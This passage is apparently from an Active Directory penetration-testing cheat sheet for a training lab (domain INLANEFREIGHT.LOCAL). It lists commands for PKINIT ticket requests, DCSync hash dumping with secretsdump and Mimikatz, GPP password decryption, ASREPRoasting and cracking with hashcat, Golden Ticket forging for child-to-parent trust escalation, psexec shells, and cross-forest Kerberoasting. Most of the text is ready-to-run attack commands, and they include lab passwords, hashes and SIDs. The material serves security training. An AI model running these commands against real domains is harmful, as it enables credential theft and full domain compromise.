| `python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64 certificate> = dc01.ccache` | Uses `gettgtpkinit`.py to request a TGT ticket for the Domain Controller (`dc01.ccache`) from a Linux-based host. |
| `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` | Impacket tool used to perform a DCSync attack and retrieve one or all of the `NTLM password hashes` from the target Windows domain. Performed from a Linux-based host. |
| `klist`                                                      | `krb5-user` command used to view the contents of the `ccache` file. Performed from a Linux-based host. |
| `python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$` | Used to submit TGS requests using `getnthash.py` from a Linux-based host. |
| `secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba` | Impacket tool used to extract hashes from `NTDS.dit` using a `DCSync attack` and a captured hash (`-hashes`). Performed from a Linux-based host. |
| `.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /<base64 certificate>=/ptt` | Uses Rubeus to request a TGT and perform a `pass-the-ticket attack` using the machine account (`/user:ACADEMY-EA-DC01$`) of a Windows target. Performed from a Windows-based host. |
| `mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt`      | Performs a DCSync attack using `Mimikatz`. Performed from a Windows-based host. |



# Miscellaneous Misconfigurations

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Import-Module .\SecurityAssessment.ps1`                     | Used to import the module `Security Assessment.ps1`. Performed from a Windows-based host. |
| `Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` | SecurityAssessment.ps1 based tool used to enumerate a Windows target for `MS-PRN Printer bug`. Performed from a Windows-based host. |
| `adidnsdump -u inlanefreight\\forend ldap://172.16.5.5`      | Used to resolve all records in a DNS zone over `LDAP` from a Linux-based host. |
| `adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r`   | Used to resolve unknown records in a DNS zone by performing an `A query` (`-r`) from a Linux-based host. |
| `Get-DomainUser * \| Select-Object samaccountname,description ` | PowerView tool used to display the description field of select objects (`Select-Object`) on a target Windows domain from a Windows-based host. |
| `Get-DomainUser -UACFilter PASSWD_NOTREQD \| Select-Object samaccountname,useraccountcontrol` | PowerView tool used to check for the `PASSWD_NOTREQD` setting of select objects (`Select-Object`) on a target Windows domain from a Windows-based host. |
| `ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts`    | Used to list the contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host. |

# Group Policy Enumeration & Attacks

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE`    | Tool used to decrypt a captured `group policy preference password` from a Linux-based host. |
| `crackmapexec smb -L \| grep gpp`                              | Locates and retrieves a `group policy preference password` using `CrackMapExec`, the filters the output using `grep`. Peformed from a Linux-based host. |
| `crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin` | Locates and retrieves any credentials stored in the `SYSVOL` share of a Windows target using `CrackMapExec` from a Linux-based host. |
| `Get-DomainGPO \| select displayname`                          | PowerView tool used to enumerate GPO names in a target Windows domain from a Windows-based host. |
| `Get-GPO -All \| Select DisplayName`                          | PowerShell cmd-let used to enumerate GPO names. Performed from a Windows-based host. |
| `$sid=Convert-NameToSid "Domain Users" `                     | Creates a variable called `$sid` that is set equal to the `Convert-NameToSid` tool and specifies the group account `Domain Users`. Performed from a Windows-based host. |
| `Get-DomainGPO \| Get-ObjectAcl \| ?{$_.SecurityIdentifier -eq $sid` | PowerView tool that is used to check if the `Domain Users`  (`eq $sid`) group has any rights over one or more GPOs. Performed from a Windows-based host. |
| `Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532`         | PowerShell cmd-let used to display the name of a GPO given a `GUID`. Performed from a Windows-based host. |



# ASREPRoasting

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-DomainUser -PreauthNotRequired \| select samaccountname,userprincipalname,useraccountcontrol \| fl` | PowerView based tool used to search for the `DONT_REQ_PREAUTH` value across in user accounts in a target Windows domain. Performed from a Windows-based host. |
| `.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat` | Uses `Rubeus` to perform an `ASEP Roasting attack` and formats the output for `Hashcat`. Performed from a Windows-based host. |
| `hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt ` | Uses `Hashcat` to attempt to crack the captured hash using a wordlist (`rockyou.txt`). Performed from a Linux-based host. |
| `kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt ` | Enumerates users in a target Windows domain and automatically retrieves the `AS` for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host. |



# Trust Relationships - Child > Parent Trusts 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Import-Module activedirectory`                              | Used to import the `Active Directory` module. Performed from a Windows-based host. |
| `Get-ADTrust -Filter *`                                      | PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host. |
| `Get-DomainTrust `                                           | PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host. |
| `Get-DomainTrustMapping`                                     | PowerView tool used to perform a domain trust mapping from a Windows-based host. |
| `Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL \| select SamAccountName` | PowerView tools used to enumerate users in a target child domain from a Windows-based host. |
| `mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt`          | Uses Mimikatz to obtain the `KRBTGT` account's `NT Hash` from a Windows-based host. |
| `Get-DomainSID`                                              | PowerView tool used to get the SID for a target child domain from a Windows-based host. |
| `Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" \| select distinguishedname,objectsid` | PowerView tool used to obtain the `Enterprise Admins` group's SID from a Windows-based host. |
| `ls \\academy-ea-dc01.inlanefreight.local\c$`                | Used to attempt to list the contents of the C drive on a target Domain Controller. Performed from a Windows-based host. |
| `mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt` | Uses `Mimikatz` to create a `Golden Ticket` from a Windows-based host . |
| `.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt` | Uses `Rubeus` to create a `Golden Ticket` from a Windows-based host. |
| `mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm`     | Uses `Mimikatz` to perform a DCSync attack from a Windows-based host. |
| `secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt` | Impacket tool used to perform a DCSync attack from a Linux-based host. |
| `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 ` | Impacket tool used to perform a `SID Brute forcing` attack from a Linux-based host. |
| `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 \| grep "Domain SID"` | Impacket tool used to retrieve the SID of a target Windows domain from a Linux-based host. |
| `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 \| grep -B12 "Enterprise Admins"` | Impacket tool used to retrieve the `SID` of a target Windows domain and attach it to the Enterprise Admin group's `RID` from a Linux-based host. |
| `ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker` | Impacket tool used to create a `Golden Ticket` from a Linux-based host. |
| `export KRB5CCNAME=hacker.ccache`                            | Used to set the `KRB5CCNAME Environment Variable` from a Linux-based host. |
| `psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5` | Impacket tool used to establish a shell session with a target Domain Controller from a Linux-based host. |
| `raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm` | Impacket tool that automatically performs an attack that escalates from child to parent domain. |



# Trust Relationships - Cross-Forest 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL \| select SamAccountName` | PowerView tool used to enumerate accounts for associated `SPNs` from a Windows-based host. |
| `Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc \| select samaccountname,memberof` | PowerView tool used to enumerate the `mssqlsvc` account from a Windows-based host. |
| ` .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap` | Uses `Rubeus` to perform a Kerberoasting Attack against a target Windows domain (`/domain:FREIGHTLOGISTICS.local`) from a Windows-based host. |
| `Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL` | PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host. |
| `Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator` | PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host. |
| `GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley` | Impacket tool used to request (`-request`) the TGS ticket of an account in a target Windows domain (`-target-domain`) from a Linux-based host. |
| `bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2` | Runs the Python implementation of `BloodHound` against a target Windows domain from a Linux-based host. |
| `zip -r ilfreight_bh.zip *.json`                             | Used to compress multiple files into 1 single `.zip` file to be uploaded into the BloodHound GUI. |
